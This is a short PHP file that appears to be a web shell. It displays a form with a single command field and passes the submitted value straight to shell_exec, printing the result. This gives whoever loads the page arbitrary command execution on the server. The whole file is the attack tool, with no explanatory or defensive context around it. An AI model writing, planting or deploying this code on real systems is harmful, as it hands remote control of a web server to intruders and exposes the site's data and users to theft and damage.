<?php
echo "<form method='POST'>
<input type='text' name='cmd'>
<input type='submit' value='Execute'>
</form>";
if(isset($_POST['cmd'])){
    echo "<pre>" . shell_exec($_POST['cmd']) . "</pre>";
}
?>
